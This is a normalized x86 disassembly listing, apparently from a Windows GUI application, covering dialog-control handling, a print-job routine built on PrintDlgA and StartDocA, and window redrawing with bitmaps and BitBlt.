call ebx
push eax
call ebp
push 0x0
push 0xa29
push esi
call ebx
push eax
push 0x469
push 0xa35
push esi
call ebx
mov edi [ SendMessageA@IAT ]
push eax
call edi
push 0x20
push 0x1
push 0x46f
push 0xa35
push esi
call ebx
push eax
call edi
movzx ecx [ rw-data ]
push ecx
push 0x0
push 0x467
push 0xa35
push esi
call ebx
push eax
call edi
push 0x0
push 0xa2a
push esi
call ebx
push eax
push 0x469
push 0xa36
push esi
call ebx
push eax
call edi
push 0x20
push 0x1
push 0x46f
push 0xa36
push esi
call ebx
push eax
call edi
movzx edx [ rw-data ]
push edx
push 0x0
push 0x467
push 0xa36
push esi
call ebx
push eax
call edi
push 0x0
push 0x3e8
push 0x4d2
push esi
call [ SetTimer@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x170
retn 0x10
mov ecx [ rw-data ]
cmp ecx 0x2
jne r-xdata
cmp [ esp + 0x18c ] 0x422
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ ebx + 0xdc0 ]
push edx
push esi
call edi
test eax eax
je r-xdata
xor ebp ebp
lea esp [ esp ]
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ecx 0x3
jne r-xdata
mov edx edi
and edx 0x1
lea edi [ edi + edx - 0x1 ]
jmp r-xdata
push 0xa3c
push edi
mov [ esp + 0x1c ] 0x0
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
lea ecx [ ebp - 0x1 ]
mov [ rw-data ] ecx
xor bl bl
push 0xa3c
push edi
mov [ esp + 0x1c ] 0x0
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
push ebx
push esi
call edi
test eax eax
je r-xdata
mov [ rw-data ] ebp
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov [ rw-data ] eax
mov eax [ esp + 0x28 ]
mov [ rw-data ] ecx
mov ecx [ rw-data ]
dec ebx
push 0xa33
dec ebp
push esi
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ rw-data ] ebp
mov [ rw-data ] ecx
call edi
dec eax
neg eax
sbb eax eax
push 0xa39
inc eax
push esi
mov [ rw-data ] eax
call edi
dec eax
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
xor ebx ebx
cmp edi 0x1
jge r-xdata
mov eax edi
and eax 0x1
add edi eax
mov eax [ rw-data ]
test eax eax
mov esi 0x1
je r-xdata
test bl bl
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov esi 0x1
je r-xdata
test bl bl
jne r-xdata
inc ebp
cmp ebp 0x4
jl r-xdata
mov [ rw-data ] ebp
inc ebx
cmp ebx 0x4
jl r-xdata
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp edi eax
jle r-xdata
mov edi 0x1
jmp r-xdata
push 0xa33
push edi
call [ IsDlgButtonChecked@IAT ]
imul esi [ esp + 0x10 ]
imul esi [ esp + 0x18 ]
cmp eax 0x1
jne r-xdata
mov esi 0x2
mov [ esp + 0x14 ] 0x1
cmp ebp eax
jne r-xdata
push 0xa33
push edi
call [ IsDlgButtonChecked@IAT ]
imul esi [ esp + 0x18 ]
imul esi [ esp + 0x10 ]
cmp eax 0x1
jne r-xdata
mov esi 0x2
mov [ esp + 0x14 ] 0x1
cmp ebp eax
jne r-xdata
lea ebx [ ebp + 0xa2f ]
lea eax [ ebx - 0x4 ]
push eax
push esi
call edi
test eax eax
je r-xdata
push 0xa3c
push esi
call edi
dec eax
push 0x0
neg eax
push 0x0
sbb eax eax
push 0x482
inc eax
push esi
mov [ rw-data ] eax
call [ GetDlgItemInt@IAT ]
test eax eax
mov [ rw-data ] eax
jg r-xdata
lea edx [ ebx + 0xdc0 ]
push edx
push esi
call edi
test eax eax
je r-xdata
xor ebp ebp
test ecx ecx
lea edx [ edi - 0x1 ]
mov [ rw-data ] edx
mov esi 0x1
je r-xdata
mov edi eax
lea eax [ esi + ebp - 0x1 ]
xor esi esi
mov eax [ esp + 0x14 ]
shl esi 0x1
sub esi eax
lea eax [ esi + ebp - 0x1 ]
mov esi 0x1
jmp r-xdata
mov eax [ rw-data ]
lea esi [ esi + ebp - 0x1 ]
cmp esi eax
jle r-xdata
mov eax [ esp + 0x14 ]
shl esi 0x1
sub esi eax
push 0x411
push esi
call edi
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov [ rw-data ] 0x1
push ebx
push esi
call edi
test eax eax
je r-xdata
mov [ rw-data ] ebp
push 0xa33
push ebx
call [ IsDlgButtonChecked@IAT ]
imul esi [ esp + 0x10 ]
imul esi ebp
cmp eax 0x1
jne r-xdata
mov esi 0x2
push esi
push 0xa39
push edi
call [ GetDlgItem@IAT ]
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push esi
push 0xa3a
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
push esi
push 0xa3c
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
push esi
push 0xa43
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
push esi
push 0xa44
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
push esi
push 0xa45
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
mov edx [ esp + 0x10 ]
push 0x0
push edx
push 0x481
push edi
call [ SetDlgItemInt@IAT ]
test bl bl
je r-xdata
mov [ esp + 0x10 ] ecx
mov ecx [ rw-data ]
cmp eax ecx
mov [ esp + 0x10 ] eax
jle r-xdata
push 0x0
push esi
push 0x481
push edi
call [ SetDlgItemInt@IAT ]
test bl bl
jne r-xdata
mov esi eax
inc ebp
cmp ebp 0x4
jl r-xdata
mov [ rw-data ] ebp
lea esi [ esi + edi - 0x1 ]
lea esi [ edi + esi * 2 - 0x1 ]
jmp r-xdata
push 0x420
push 0x422
push 0x420
push edi
call [ CheckRadioButton@IAT ]
jmp r-xdata
dec ebp
mov [ rw-data ] ebp
lea ebx [ ebp + 0xa2f ]
lea eax [ ebx - 0x4 ]
push eax
push esi
call edi
test eax eax
je r-xdata
push 0xa3c
push esi
call edi
dec eax
neg eax
sbb eax eax
push 0xa44
inc eax
push esi
mov [ rw-data ] eax
call edi
cmp eax 0x1
jne r-xdata
push 0x0
push edi
mov edi [ SetDlgItemInt@IAT ]
push 0x480
push ebx
call edi
push 0x0
push esi
push 0x481
push ebx
call edi
push 0x0
push 0x0
push 0xa38
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov esi eax
mov eax [ rw-data ]
cmp esi eax
jle r-xdata
push 0xa45
push esi
call edi
dec eax
neg eax
sbb eax eax
pop edi
and eax 0xfffffffe
pop esi
add eax 0x2
pop ebp
mov [ rw-data ] eax
mov [ rw-data ] 0x1
mov eax 0x1
pop ebx
add esp 0x170
retn 0x10
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
mov [ rw-data ] al
pop ebx
add esp 0x170
retn 0x10
sub_477040
push 0xffffffff
push sub_4c0f2b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
xor eax eax
mov [ esp + 0x6c ] eax
push ebx
mov [ esp + 0x74 ] eax
push ebp
mov [ esp + 0x7c ] eax
push esi
mov [ esp + 0x84 ] eax
xor ebp ebp
push edi
mov [ esp + 0x8c ] eax
mov [ esp + 0x7c ] 0x14
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebp
mov [ esp + 0x20 ] 0x0
cmp [ rw-data ] ebp
mov [ esp + 0xa8 ] ebp
je r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov esi eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov esi eax
jae r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov esi rw-data
mov eax esi
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
mov edi edi
mov esi rw-data
mov eax esi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x24 ]
call sub_401e80
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x24 ]
call sub_401e80
cmp [ esp + 0x34 ] 0x10
mov eax [ esp + 0x20 ]
jae r-xdata
lea eax [ esp + 0x20 ]
mov [ esp + 0x80 ] eax
mov edx [ esp + 0x20 ]
mov [ esp + 0x80 ] edx
jmp r-xdata
push eax
call sub_458010
mov ecx [ esp + 0x34 ]
add esp 0x4
cmp eax ecx
ja r-xdata
lea eax [ esp + 0x20 ]
mov eax [ rw-data ]
mov edx [ rw-data ]
inc eax
cmp edx ecx
mov [ esp + 0x50 ] ax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
inc eax
inc ecx
mov [ esp + 0x50 ] ax
mov [ esp + 0x52 ] cx
jmp r-xdata
mov edx [ rw-data ]
xor eax eax
lea edi [ esp + 0x38 ]
[ edi ]
mov ecx [ rw-data ]
stosw [ edi ]
mov edi [ esp + 0xb0 ]
mov eax 0x1
mov [ esp + 0x58 ] ax
mov [ esp + 0x54 ] ax
mov ax [ rw-data ]
mov [ esp + 0x40 ] ecx
mov [ esp + 0x56 ] ax
mov eax [ rw-data ]
mov ecx 0x2
cmp eax ecx
mov [ esp + 0x38 ] 0x42
mov [ esp + 0x3c ] edi
mov [ esp + 0x44 ] edx
mov [ esp + 0x4c ] 0x105106
jl r-xdata
sub eax ecx
push ebp
push eax
lea ecx [ esp + 0x24 ]
call sub_4017f0
jmp r-xdata
push 0xffffffff
push eax
lea ecx [ esp + 0x24 ]
call sub_401ba0
jmp r-xdata
mov [ esp + 0x52 ] ax
cmp [ rw-data ] ebp
je r-xdata
mov ebx [ GetWindowLongA@IAT ]
movzx eax ax
push 0xfffffffa
dec eax
push edi
mov [ rw-data ] eax
mov [ rw-data ] ebp
call ebx
lea ecx [ esp + 0x38 ]
push ecx
mov [ esp + 0x5e ] eax
mov [ esp + 0x6e ] 0xa28
mov [ esp + 0x66 ] sub_475e60
call [ PrintDlgA@IAT ]
mov esi eax
cmp esi ebp
mov [ esp + 0x14 ] esi
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx 0x10
cmp eax ecx
jb r-xdata
mov eax [ esp + 0x44 ]
cmp eax ebp
mov edi [ GlobalFree@IAT ]
je r-xdata
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
mov [ rw-data ] eax
test [ esp + 0x4c ] 0x2
mov [ rw-data ] edx
je r-xdata
mov edx [ rw-data ]
inc edx
mov [ esp + 0x52 ] dx
jmp r-xdata
mov eax [ esp + 0x40 ]
cmp eax ebp
je r-xdata
cmp [ rw-data ] ebp
jne r-xdata
movzx eax [ esp + 0x54 ]
dec eax
mov [ esp + 0x10 ] eax
movzx eax [ esp + 0x56 ]
movzx eax [ esp + 0x50 ]
dec eax
mov [ esp + 0x10 ] eax
movzx eax [ esp + 0x52 ]
jmp r-xdata
cmp [ esp + 0x34 ] 0x10
jb r-xdata
cmp [ rw-data ] ebp
jne r-xdata
push eax
call edi
push 0x0
push r--data
push r--data
push edi
call [ MessageBoxA@IAT ]
mov ecx [ rw-data ]
push ecx
call [ DestroyWindow@IAT ]
push edi
call [ SetFocus@IAT ]
mov edx [ esp + 0x48 ]
push edx
call [ DeleteDC@IAT ]
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov edx [ esp + 0x48 ]
lea ecx [ esp + 0x7c ]
push ecx
push edx
call [ StartDocA@IAT ]
test eax eax
jle r-xdata
mov ecx [ esp + 0x48 ]
mov ebp [ GetDeviceCaps@IAT ]
push 0x8
dec eax
push ecx
mov [ esp + 0x20 ] eax
call ebp
mov edx [ esp + 0x48 ]
push 0xa
push edx
mov esi eax
call ebp
mov ebp [ rw-data ]
mov ecx eax
mov eax esi
imul eax [ rw-data ]
cdq
idiv ebp
push 0x0
push sub_45b9f0
push edi
push 0x67
push 0xfffffffa
push edi
mov [ esp + 0xa8 ] eax
mov eax esi
imul eax [ rw-data ]
cdq
idiv ebp
mov ebp [ rw-data ]
sub esi eax
mov eax ecx
imul eax [ rw-data ]
cdq
idiv ebp
mov [ esp + 0xac ] eax
mov eax ecx
imul eax [ rw-data ]
cdq
idiv ebp
sub ecx eax
mov ebp ecx
call ebx
push eax
call [ CreateDialogParamA@IAT ]
push 0x5
push eax
mov [ rw-data ] eax
call [ ShowWindow@IAT ]
mov eax [ esp + 0x48 ]
push sub_45b970
push eax
call [ SetAbortProc@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
mov ecx [ esp + 0x20 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push eax
call edi
mov eax [ esp + 0x14 ]
jmp r-xdata
mov eax [ esp + 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
cmp ecx 0x2
mov ebx [ esp + 0x10 ]
mov eax ebx
jne r-xdata
mov ecx [ esp + 0xa0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x9c
retn
cmp ecx 0x3
jne r-xdata
and eax 0x1
jmp r-xdata
mov edx [ esp + 0x90 ]
mov edi [ esp + 0x18 ]
push 0x0
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ esp + 0xa8 ]
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] esi
mov [ ecx + 0xc ] ebp
mov ecx [ esp + 0x5c ]
push ecx
push 0x0
push eax
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x38 ]
push eax
mov [ esp + 0x3c ] ebx
mov [ esp + 0x38 ] edi
call sub_4751c0
add esp 0x28
test eax eax
je r-xdata
mov eax ebx
and eax 0x1
inc eax
mov edx [ esp + 0x48 ]
push edx
call [ AbortDoc@IAT ]
mov [ esp + 0x14 ] 0x0
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esp + 0x48 ]
push eax
call [ EndDoc@IAT ]
mov ecx [ esp + 0x48 ]
push ecx
call [ DeleteDC@IAT ]
mov edx [ rw-data ]
push edx
call [ DestroyWindow@IAT ]
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
mov esi [ esp + 0x14 ]
jmp r-xdata
cmp eax 0x2
je r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ eax - 0x1 ]
test cl 0x1
je r-xdata
mov eax [ esp + 0x10 ]
add eax 0x2
cmp eax 0x3
je r-xdata
mov ecx [ esp + 0x10 ]
cmp eax ecx
jne r-xdata
inc eax
jmp r-xdata
mov [ esp + 0x14 ] 0x1
mov ecx [ esp + 0x90 ]
push 0x0
sub esp 0x10
mov edx esp
mov [ edx ] ecx
mov ecx [ esp + 0xa8 ]
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] esi
mov [ edx + 0xc ] ebp
mov edx [ esp + 0x5c ]
push edx
push 0x0
push eax
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x38 ] edi
call sub_4751c0
add esp 0x28
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
inc eax
jmp r-xdata
lea eax [ ecx + 0x1 ]
jmp r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
cmp eax edi
jg r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
sub_477580
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0f48
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
push ebx
push ebp
add eax 0xffffffb2
cmp eax 0xc6
push esi
push edi
ja r-xdata
xor eax eax
movzx eax [ eax + lookup_table_477990 ]
jmp [ eax * 4 + jump_table_47797c ]
mov ecx [ rw-data ]
mov ebp [ esp + 0x20 ]
push ecx
push 0x20
push 0x2
mov edi 0x8cb
mov ebx 0x8cc
mov esi ebp
call sub_457b80
mov edx [ rw-data ]
shr edx 0x14
push edx
push 0xc8
push 0x0
mov edi 0x8cd
mov ebx 0x8ce
call sub_457b80
mov eax [ rw-data ]
mov ecx 0x8d8
mov edx ebp
call sub_457bf0
mov eax [ rw-data ]
push eax
push 0x20
push 0x0
mov edi 0x8cf
mov ebx 0x8d0
call sub_457b80
mov ecx [ rw-data ]
push ecx
push 0x20
push 0x0
mov edi 0x8d1
mov ebx 0x8d2
call sub_457b80
mov edx [ rw-data ]
push edx
push 0x64
push 0x0
mov edi 0x8d3
mov ebx 0x8d4
call sub_457b80
mov eax [ rw-data ]
push eax
push 0x4
push 0x0
mov esi 0x8d5
mov edi ebp
call sub_457c30
mov ecx [ rw-data ]
add esp 0x48
push ecx
push 0x200
push 0x0
mov edi 0x8d6
mov ebx 0x8d7
mov esi ebp
call sub_457b80
add esp 0xc
mov eax 0x1
jmp r-xdata
mov ecx [ esp + 0x28 ]
movzx eax cx
add eax 0xfffff735
cmp eax 0xd
ja r-xdata
mov eax [ esp + 0x20 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax [ esp + 0x2c ]
mov eax [ eax + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x10
mov eax 0x1
jmp r-xdata
movzx edx [ eax + lookup_table_477a64 ]
jmp [ edx * 4 + jump_table_477a58 ]
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x4
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
mov eax [ esp + 0x20 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax 0x1
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x24 ] ecx
call sub_404310
mov ebx [ esp + 0x20 ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x20
push 0x2
xor ebp ebp
push 0x8cc
mov ecx 0x8cb
mov edx ebx
mov [ esp + 0x28 ] ebp
call sub_457ca0
mov eax [ esp + 0x30 ]
mov ecx [ rw-data ]
add esp 0x10
cmp ecx eax
je r-xdata
lea edx [ esp + 0x20 ]
push edx
push 0xc8
push ebp
push 0x8ce
mov ecx 0x8cd
mov edx ebx
call sub_457ca0
mov eax [ esp + 0x30 ]
mov ecx [ rw-data ]
shl eax 0x14
add esp 0x10
cmp ecx eax
je r-xdata
push eax
call sub_46fbb0
add esp 0x4
push rw-data
mov eax 0x8d8
mov ecx ebx
call sub_457ce0
push rw-data
push 0x20
push ebp
push 0x8d0
mov ecx 0x8cf
mov edx ebx
call sub_457ca0
push rw-data
push 0x20
push ebp
push 0x8d2
mov ecx 0x8d1
mov edx ebx
call sub_457ca0
push rw-data
push 0x64
push ebp
push 0x8d4
mov ecx 0x8d3
mov edx ebx
call sub_457ca0
push rw-data
push 0x4
push ebp
mov eax 0x8d5
mov ecx ebx
call sub_457d50
add esp 0x40
lea eax [ esp + 0x20 ]
push eax
push 0x200
push ebp
push 0x8d7
mov ecx 0x8d6
mov edx ebx
call sub_457ca0
mov eax [ esp + 0x30 ]
mov ecx [ rw-data ]
add esp 0x10
cmp ecx eax
je r-xdata
cmp [ rw-data ] ebp
mov [ rw-data ] eax
jne r-xdata
mov ecx rw-data
call sub_401420
mov [ rw-data ] eax
call sub_472460
mov esi [ rw-data ]
cmp esi eax
jbe r-xdata
mov edx [ rw-data ]
cmp edx ebp
je r-xdata
mov edi [ LocalFree@IAT ]
lea esp [ esp ]
cmp eax ebp
jbe r-xdata
mov ecx [ rw-data ]
sub ecx edx
sar ecx 0x2
cmp ecx ebp
jne r-xdata
mov ecx rw-data
call sub_4602b0
mov eax [ eax ]
mov ecx [ rw-data ]
imul eax eax 0x70
sub esi [ eax + ecx + 0x20 ]
mov ecx rw-data
mov [ rw-data ] esi
call sub_4602b0
mov edx [ eax ]
mov eax [ rw-data ]
mov ecx [ eax + edx * 4 ]
push ecx
call edi
mov ecx rw-data
call sub_4602b0
mov edx [ eax ]
mov eax [ rw-data ]
mov ecx rw-data
mov [ eax + edx * 4 ] ebp
call sub_4602e0
mov esi [ rw-data ]
mov eax [ rw-data ]
cmp esi eax
ja r-xdata
jne r-xdata
push ebp
mov ecx rw-data
call sub_4010f0
push eax
mov ecx rw-data
call sub_42c920
mov ecx rw-data
call sub_4010f0
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x2
mov edx ecx
shr ecx 0x2
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ rw-data ]
cmp eax ebp
mov ecx rw-data
call sub_462cf0
mov ecx rw-data
call sub_460310
mov [ rw-data ] ebp
sub_477a80
mov eax [ rw-data ]
sub esp 0xa8
test eax eax
push ebx
push ebp
push esi
push edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa8
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ebx [ esp + 0xc4 ]
mov ecx [ esp + 0xbc ]
mov eax [ esp + 0xc0 ]
mov esi ecx
mov edi eax
add ecx ebx
add eax ebx
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0xcc ]
mov [ esp + 0x38 ] eax
mov eax [ rw-data ]
sub esi ebx
sub edi ebx
cmp eax ecx
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] edi
je r-xdata
mov ebp [ esp + 0xcc ]
xor eax eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x54 ] eax
lea eax [ esp + 0x54 ]
push eax
push ebp
mov [ rw-data ] ebp
call [ GetClientRect@IAT ]
push ebp
call [ GetDC@IAT ]
mov ebp eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x14 ] ebp
je r-xdata
test eax eax
je r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0x5c ]
mov ebp esi
sub eax [ esp + 0x54 ]
xor ecx ecx
test eax eax
setle cl
lea esi [ ebx + ebx ]
lea edx [ esi + ebp ]
dec ecx
and ecx eax
cmp edx ecx
jle r-xdata
mov al [ esp + 0xd4 ]
test al al
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
or [ rw-data ] 0x1
xor eax eax
xor ecx ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
jmp r-xdata
test ebp ebp
jge r-xdata
xor ecx ecx
test eax eax
setle cl
dec ecx
and ecx eax
mov ebp ecx
sub ebp esi
mov dl [ esp + 0xd4 ]
test dl dl
je r-xdata
mov ebx [ rw-data ]
xor edi edi
cmp ebx edi
je r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov edx [ esp + 0x58 ]
mov ecx [ esp + 0x60 ]
sub ecx edx
xor edx edx
test ecx ecx
setle dl
lea ebx [ esi + edi ]
dec edx
and edx ecx
cmp ebx edx
jle r-xdata
xor ebp ebp
test [ rw-data ] 0x40000000
je r-xdata
mov esi [ rw-data ]
sub esi eax
xor edx edx
test esi esi
setle dl
push 0xcc0020
push 0x0
push 0x0
dec edx
and edx esi
mov esi [ rw-data ]
mov edi edx
sub esi ecx
xor edx edx
test esi esi
setle dl
dec edx
and edx esi
mov esi [ rw-data ]
push esi
push edi
push edx
push eax
push ecx
push ebp
call [ BitBlt@IAT ]
mov eax [ esp + 0xcc ]
push ebp
push eax
call [ ReleaseDC@IAT ]
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa8
retn
mov ebx [ esp + 0xc4 ]
xor esi esi
add ebx ebx
jmp r-xdata
mov esi [ rw-data ]
xor edx edx
sub esi eax
test esi esi
setle dl
push 0xcc0020
push 0x0
push 0x0
push ebx
dec edx
and edx esi
mov esi [ rw-data ]
mov edi edx
sub esi ecx
xor edx edx
test esi esi
setle dl
push edi
dec edx
and edx esi
push edx
push eax
push ecx
push ebp
call [ BitBlt@IAT ]
xor edi edi
test edi edi
jge r-xdata
xor edx edx
test ecx ecx
setle dl
dec edx
and edx ecx
mov edi edx
sub edi esi
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x94 ] eax
mov eax [ rw-data ]
test eax eax
push edx
push ecx
mov [ esp + 0x70 ] ecx
mov [ esp + 0xac ] edx
mov [ esp + 0x50 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi * 4 + rw-data ]
cmp eax edi
je r-xdata
xor edx edx
mov [ esp + 0x2c ] ebp
add ebp esi
test eax eax
setle dl
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] ebp
dec edx
and edx eax
cmp ebp edx
jle r-xdata
xor edi edi
push ecx
mov [ ecx ] eax
mov ecx [ rw-data ]
test ecx ecx
mov [ esp + 0x54 ] esp
mov eax esp
je r-xdata
inc [ eax + 0xd48 ]
mov edx [ rw-data ]
mov bl [ rw-data ]
or edx 0x80000000
push eax
mov [ rw-data ] 0x0
mov [ rw-data ] edx
call [ GetDC@IAT ]
mov esi eax
push 0x0
push esi
call sub_473580
mov ecx [ rw-data ]
add esp 0x8
push esi
push ecx
call [ ReleaseDC@IAT ]
mov [ rw-data ] bl
mov eax [ esi * 4 + rw-data ]
cmp eax edi
je r-xdata
push eax
call [ DeleteDC@IAT ]
mov [ esi * 4 + rw-data ] edi
mov ebx [ esp + 0xc4 ]
mov ebp [ esp + 0x14 ]
xor eax eax
add esi edi
test ecx ecx
setle al
mov [ esp + 0x38 ] esi
dec eax
and eax ecx
cmp esi eax
jle r-xdata
xor edx edx
test eax eax
setle dl
dec edx
and edx eax
mov [ esp + 0x34 ] edx
mov [ eax ] ecx
push 0x1
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x58 ]
push ecx
lea edx [ esp + 0x60 ]
push edx
lea eax [ esp + 0xb4 ]
push eax
call sub_45ddb0
mov eax [ esp + 0x7c ]
mov ebp [ esp + 0x74 ]
mov edx [ esp + 0x64 ]
sub eax ebp
mov ebx [ esp + 0x78 ]
xor ecx ecx
add esp 0x20
test eax eax
setle cl
dec ecx
and eax ecx
sub eax edx
cdq
sub eax edx
mov edi eax
mov eax [ esp + 0x60 ]
sub eax ebx
mov ebx [ esp + 0x50 ]
xor edx edx
sar edi 0x1
test eax eax
setle dl
dec edx
and eax edx
sub eax ebx
cdq
sub eax edx
mov esi eax
sar esi 0x1
test edi edi
mov [ esp + 0x4c ] esi
jge r-xdata
inc [ ecx + 0xd48 ]
push ebx
push ebx
push ebp
call [ CreateCompatibleBitmap@IAT ]
cmp eax edi
mov [ esi * 4 + rw-data ] eax
push ebp
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov [ esi * 4 + rw-data ] edi
xor eax eax
test ecx ecx
setle al
dec eax
and eax ecx
mov [ esp + 0x38 ] eax
test esi esi
jge r-xdata
xor edi edi
mov edx [ esp + 0xd0 ]
push edx
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa8
retn
call [ CreateCompatibleDC@IAT ]
cmp eax edi
mov [ esi * 4 + rw-data ] eax
je r-xdata
mov eax [ rw-data ]
mov ebp [ esp + 0xbc ]
sub eax edi
add eax ebp
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
push ecx
fmul [ esp + 0xcc ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0xc4 ]
mov ebp [ esp + 0xc8 ]
sub ecx esi
add ecx edx
mov [ esp + 0x1c ] ecx
fild [ esp + 0x1c ]
mov ebx eax
sub ebx ebp
fmul [ esp + 0xcc ]
mov [ esp + 0x84 ] ebx
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x58 ]
mov esi eax
sub esi ebp
lea eax [ ebp + ebp ]
mov ebp eax
mov edx eax
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x60 ]
sub eax ecx
xor ecx ecx
add esp 0x4
test eax eax
setle cl
mov [ esp + 0x7c ] esi
mov [ esp + 0x3c ] ebp
mov [ esp + 0x40 ] edx
dec ecx
and ecx eax
cmp ebp ecx
jle r-xdata
xor esi esi
mov [ esp + 0x4c ] esi
mov eax [ esi * 4 + rw-data ]
push eax
call [ DeleteObject@IAT ]
mov ecx [ esp + 0xcc ]
push ebp
push ecx
mov [ esi * 4 + rw-data ] edi
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa8
retn
mov ecx [ esi * 4 + rw-data ]
push ecx
push eax
call [ SelectObject@IAT ]
inc esi
cmp esi 0x3
jl r-xdata
mov ecx [ esp + 0x58 ]
mov eax [ esp + 0x60 ]
sub eax ecx
xor ecx ecx
test eax eax
setle cl
dec ecx
and ecx eax
cmp edx ecx
jle r-xdata
xor ecx ecx
test eax eax
setle cl
dec ecx
and ecx eax
mov [ esp + 0x3c ] ecx
mov edx [ esp + 0xc4 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ rw-data ] edx
mov eax [ rw-data ]
test eax eax
je r-xdata
xor edx edx
test eax eax
setle dl
dec edx
and edx eax
mov [ esp + 0x40 ] edx
fld [ rw-data ]
mov eax [ rw-data ]
test eax eax
fmul [ esp + 0xc8 ]
mov [ rw-data ] ebx
mov [ rw-data ] esi
fstp [ rw-data ]
mov [ esp + 0x13 ] 0x0
je r-xdata
mov al [ rw-data ]
xor ebp ebp
